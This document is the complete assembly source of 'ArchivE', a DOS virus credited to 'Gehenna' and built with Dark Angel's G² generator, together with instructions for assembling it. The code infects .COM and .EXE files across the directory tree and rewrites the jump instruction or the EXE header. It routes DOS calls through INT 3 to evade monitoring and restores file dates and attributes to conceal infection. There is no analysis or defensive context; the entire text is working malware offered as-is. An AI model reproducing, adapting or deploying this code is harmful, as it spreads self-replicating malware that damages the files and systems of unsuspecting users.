; Virus generated by G� 0.70�
; G� written by Dark Angel of Phalcon/Skism
                
; File: ARCHIVE.ASM
;     <ArchivE> by <Gehenna>
                
id              =       'FE'
                
        .model  tiny
        .code   
                
; Assemble with:
; TASM /m3 filename.ASM
; TLINK /t filename.OBJ
        org     0100h
                
carrier:
        db      0E9h,0,0                ; jmp start
                
start:
        call    next
next:
        pop     bp
        sub     bp, offset next
                
        push    ds
        push    es
                
        mov     ax, 3524h
        int     0021h
        push    es
        push    bx
                
        lea     dx, [bp+INT24]          ; ASSumes ds=cs
        mov     ax, 2524h
        int     0021h
                
        push    cs
        pop     es
                
                
        push    cs
        pop     ds
                
        push    cs
        pop     es
                
        mov     ah, 001Ah               ; Set DTA
        lea     dx, [bp+offset newDTA]
        int     0021h
                
        mov     dl, 0000h               ; Default drive
        mov     ah, 0047h               ; Get directory
        lea     si, [bp+offset origdir+1]
        int     0021h
                
        push    ds
        push    es
                
        mov     ax, 3521h               ; get int 21h handler
        int     0021h
                
        push    es
        pop     ds
        xchg    bx, dx
        mov     ax, 2503h               ; set int 3 = int 21h handler
        int     0021h
                
        pop     es
        pop     ds
        lea     di, [bp+offset origCSIP2]
        lea     si, [bp+offset origCSIP]
        movsw   
        movsw   
        movsw   
        movsw   
                
        mov     byte ptr [bp+numinfect], 0000h
traverse_loop:
        lea     dx, [bp+offset COMmask]
        call    infect
        lea     dx, [bp+offset EXEmask]
        call    infect
        cmp     [bp+numinfect], 0001h
        jae     exit_traverse           ; exit if enough infected
                
        mov     ah, 003Bh               ; CHDIR
        lea     dx, [bp+offset dot_dot] ; go to previous dir
        int     0003h
        jnc     traverse_loop           ; loop if no error
                
exit_traverse:
                
        lea     si, [bp+offset origdir]
        mov     byte ptr [si], '\'
        xchg    dx, si
        mov     ah, 003Bh               ; restore directory
        int     0003h
                
        pop     dx
        pop     ds
        mov     ax, 2524h
        int     0003h
                
        pop     ds
        pop     es
                
        mov     dx, 0080h               ; in the PSP
        mov     ah, 001Ah               ; restore DTA to default
        int     0003h
                
        cmp     sp, id
        je      restore_EXE
restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3_2]
        mov     cx, 0003h               ; Caution: far from the most efficient
        rep     movsb                   ; routine
return:
        ret     
                
restore_EXE:
        mov     ax, es
        add     ax, 0010h
        add     cs:[bp+word ptr origCSIP2+2], ax
        add     ax, cs:[bp+word ptr origSPSS2]
        cli     
        mov     ss, ax
        mov     sp, cs:[bp+word ptr origSPSS2+2]
        sti     
        db      00EAh
origCSIP2       db      ?
old3_2          db      ?,?,?
origSPSS2       dd      ?
                
origCSIP        db      ?
old3            db      0cdh,20h,0
origSPSS        dd      ?
                
INT24:
        mov     al, 0003h
        iret    
                
infect:
        mov     cx, 0007h               ; all files
        mov     ah, 004Eh               ; find first
findfirstnext:
        int     0003h
        jc      return
                
        cmp     word ptr [bp+newDTA+33], 'AM' ; Check if COMMAND.COM
        mov     ah, 004Fh               ; Set up find next
        jz      findfirstnext           ; Exit if so
                
        mov     ax, 4300h
        lea     dx, [bp+newDTA+30]
        int     0003h
        jc      return
        push    cx
        push    dx
                
        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0003h
                
        mov     ax, 3D02h
        lea     dx, [bp+newDTA+30]
        int     0003h
        mov     bx, ax                  ; xchg ax,bx is more efficient
                
        mov     ax, 5700h               ; get file time/date
        int     0003h
        push    cx
        push    dx
                
        mov     ah, 003Fh
        mov     cx, 001Ah
        lea     dx, [bp+offset readbuffer]
        int     0003h
                
        mov     ax, 4202h
        xor     cx, cx
        xor     dx, dx
        int     0003h
                
        cmp     word ptr [bp+offset readbuffer], 'ZM'
        jz      checkEXE
                
        mov     cx, word ptr [bp+offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jz      jmp_close
                
        cmp     ax, 65535-(endheap-start) ; check if too large
        ja      jmp_close               ; Exit if so
                
        lea     si, [bp+offset readbuffer]
        lea     di, [bp+offset old3]
        movsw   
        movsb   
                
        mov     cx, 0003h
        sub     ax, cx
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [bp+offset readbuffer], dl
        jmp     short continue_infect
checkEXE:
        cmp     word ptr [bp+offset readbuffer+10h], id
        jnz     skipp
jmp_close:
        jmp     close
skipp:
                
        lea     si, [bp+readbuffer+14h]
        lea     di, [bp+origCSIP]
        movsw                           ; Save original CS and IP
        movsw   
                
        sub     si, 000Ah
        movsw                           ; Save original SS and SP
        movsw   
                
        push    bx                      ; save file handle
        mov     bx, word ptr [bp+readbuffer+8] ; Header size in paragraphs
        mov     cl, 0004h
        shl     bx, cl
                
        push    dx                      ; Save file size on the
        push    ax                      ; stack
                
        sub     ax, bx                  ; File size - Header size
        sbb     dx, 0000h               ; DX:AX - BX -> DX:AX
                
        mov     cx, 0010h
        div     cx                      ; DX:AX/CX = AX Remainder DX
                
        mov     word ptr [bp+readbuffer+0Eh], ax ; Para disp stack segment
        mov     word ptr [bp+readbuffer+14h], dx ; IP Offset
        mov     word ptr [bp+readbuffer+16h], ax ; Para disp CS in module.
        mov     word ptr [bp+readbuffer+10h], id ; Initial SP
                
        pop     ax                      ; Filelength in DX:AX
        pop     dx
                
        add     ax, heap-start
        adc     dx, 0000h
                
        mov     cl, 0009h
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc     
        adc     dx, ax
        pop     ax
        and     ah, 0001h
                
        mov     word ptr [bp+readbuffer+2], ax ; the EXE header.
        mov     word ptr [bp+readbuffer+4], dx ; Fix-up the file size in
                
        pop     bx                      ; restore file handle
        mov     cx, 001Ah
                
continue_infect:
        push    cx                      ; save # bytes to write
                
        mov     cx, heap-start
        lea     dx, [bp+offset start]
        mov     ah, 0040h               ; concatenate virus
        int     0003h
                
        xor     cx, cx
        mov     ax, 4200h
        cwd     
        int     0003h
                
                
        mov     ah, 0040h
        pop     cx
        lea     dx, [bp+offset readbuffer]
        int     0003h
                
        inc     [bp+numinfect]
                
close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0003h
                
        mov     ah, 003Eh
        int     0003h
                
        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     cx                      ; attributes from stack
        int     0003h
                
        mov     ah, 004Fh               ; find next
        jmp     findfirstnext
                
dot_dot         db      '..',0
EXEmask         db      '*.EXE',0
COMmask         db      '*.COM',0
creator         db      '<Gehenna>',0
virusname       db      '<ArchivE>',0

                
heap:
newDTA          db      43 dup (?)
origdir         db      65 dup (?)
numinfect       db      ?
readbuffer      db      1ah dup (?)
endheap:
        end     carrier
